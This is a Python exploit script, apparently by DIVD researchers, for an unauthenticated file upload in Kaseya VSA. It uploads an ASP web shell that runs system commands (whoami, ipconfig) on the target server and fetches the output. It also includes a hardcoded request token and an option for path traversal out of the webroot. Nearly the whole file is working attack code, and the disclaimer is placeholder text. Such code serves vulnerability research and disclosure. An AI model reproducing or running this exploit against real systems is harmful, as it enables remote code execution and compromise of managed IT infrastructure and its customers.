#!/bin/python3
#############
# SOME DISCLAIMER HERE
# WIETSE FOUND IT
# DIVD STUFF
# DONATE LINK
# 
#  _____ _______      _______         _ 
# |  __ \_   _\ \    / /  __ \       | |
# | |  | || |  \ \  / /| |  | | _ __ | |
# | |  | || |   \ \/ / | |  | || '_ \| |
# | |__| || |_   \  /  | |__| || | | | |
# |_____/_____|   \/   |_____(_)_| |_|_|                                     
#
#############
import requests
import argparse
from argparse import RawTextHelpFormatter
from random import randint, choice
from string import ascii_lowercase
from urllib.parse import unquote, quote
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class exploit():
    def __init__(self, targetHost, pathData="C%3A%5CKaseya%5CWebPages%5C", payload=None, payloadFilename=None, sessionId=None, payloadPath="./", port=5721, proto="http", requestToken="ac1906a5-d511-47e3-8500-47cc4b0ec219", proxy=None):
        self.payloadPath = payloadPath if payloadPath.endswith('/') else "{}/".payloadPath
        self.payloadFilename = payloadFilename if payloadFilename else "{1}{0}.asp".format(''.join(choice(ascii_lowercase) for i in range(8)),self.payloadPath)
        self.payload = payload if payload else self.genericPayload()
        self.sessionId = sessionId if sessionId else randint(00000,99999999)
        self.targetHost = targetHost
        self.port = port
        self.proto = proto
        self.RequestValidationToken = requestToken
        self.proxy = proxy
        self.pathData = quote(unquote(pathData))

        self.session = requests.session()

    def genericPayload(self):
        return """
<%
Server.ScriptTimeout = 180
Dim wshell, strPResult
set wshell = CreateObject("WScript.Shell")
Set objCmd = wShell.Exec("C:\Windows\System32\cmd.exe /c whoami&ipconfig")
strPResult = objCmd.StdOut.Readall()
response.write replace(replace(strPResult,"<","&lt;"),vbCrLf,"<br>")
%>
"""

    def run(self):
        url = "{proto}://{host}:{port}/SystemTab/uploader.aspx".format(proto=self.proto, host=self.targetHost, port=self.port)
        params = "Filename={filename}&PathData={path}&__RequestValidationToken={requestToken}&qqfile={filename}".format(filename=self.payloadFilename, requestToken=self.RequestValidationToken, path=self.pathData)
        cookies = {
            " sessionId": "{sessionId}".format(sessionId=self.sessionId),
            "%5F%5FRequestValidationToken": "{RequestValidationToken}".format(RequestValidationToken=self.RequestValidationToken.replace("-","%2D"))
            }
        headers = {
            'User-Agent' : 'DIVD.nl - Wietse Boonstra'
            }
        r = self.session.post(url, params=params, headers=headers, cookies=cookies, data=self.payload, proxies=self.proxy, verify=False)

        if r.status_code == 200:
            url = "{}://{}:{}/{}{}".format(self.proto, self.targetHost, self.port, unquote(self.pathData.replace("C%3A%5CKaseya%5CWebPages%5C","")), self.payloadFilename)
            print ("File uploaded, please check: {}".format(url) )
            if self.payload == self.genericPayload():
                resp = self.session.get(url, headers=headers, proxies=self.proxy, verify=False)
                if resp.status_code == 200:
                    print (resp.text.replace("<br>","\n"))
                else:
                    print ("unable to fetch payload")
        else:
            print ("Failed to upload got {}".format(r.status_code))


def main():
    parser = argparse.ArgumentParser(description="""
Exploit Unauthenticated fileupload in Kaseya VSA
#############
# SOME DISCLAIMER HERE
# WIETSE FOUND IT
# DIVD STUFF
# DONATE LINK
# 
#  _____ _______      _______         _ 
# |  __ \_   _\ \    / /  __ \       | |
# | |  | || |  \ \  / /| |  | | _ __ | |
# | |  | || |   \ \/ / | |  | || '_ \| |
# | |__| || |_   \  /  | |__| || | | | |
# |_____/_____|   \/   |_____(_)_| |_|_|                                     
#
#############
""",formatter_class=RawTextHelpFormatter)
    parser.add_argument('-t','--target',
                        required=True,
                        help='IP or domain'
                    )
    parser.add_argument('-p','--port',
                        required=True,
                        default=5721,
                        help='Port of Kaseya default 5721, 80 or 443'
                    )
    parser.add_argument('--proto', 
                        default="http",
                        help='Use http or https'
                    )
    parser.add_argument('--pathData', 
                        default="C%3A%5CKaseya%5CWebPages%5C",
                        help='Where is the Kaseya webroot C:\\Kaseya\\WebPages\\'
                    )
    parser.add_argument('--payload', 
                        default="helloworld",
                        help='Payload to use if not set we use the default set in self.genericPayload()'
                    )
    parser.add_argument('--payloadfilename', 
                        help='set a payload filename else generate random asp file'
                    )
    parser.add_argument('--payloadpath', 
                        default="./",
                        help='set a payload path, use ../../../ to get out of the webroot'
                    )
    parser.add_argument('--requesttoken', 
                        help='Set a requestToken or use the default.'
                    )
    parser.add_argument('--proxy', 
                        default=None,
                        help='set to proxy 127.0.0.1:8080'
                    )
    args = parser.parse_args()

    # sid = args.sessionid
    targetHost = args.target
    port = args.port
    proto = args.proto
    pathData = args.pathData

    payload = args.payload # should make this a read from file to
    
    proxy = args.proxy

    if proxy:
        proxy = "{ 'http' : '{0}', 'https': {0} }".format(proxy)
    try:
        x = exploit(
                targetHost, 
                port=port,
                proto="http", # port 5721 accepts http and https.
                pathData="C%3A%5CKaseya%5CWebPages%5C", # The path Kaseya is installed default it is this.
                payload=None, # Set at none we will drop self.genericPayload()
                payloadFilename=None,  # Set at None we wil create random 8 char .asp file
                sessionId=None, # not used at the moment.
                payloadPath="./", # Set this to ../../ to write outside the webdir
                requestToken="ac1906a5-d511-47e3-8500-47cc4b0ec219", # default requestToken
                proxy=proxy
            )
        x.run()
    except Exception as e:
        print (e)
        

if __name__ == "__main__":
    main()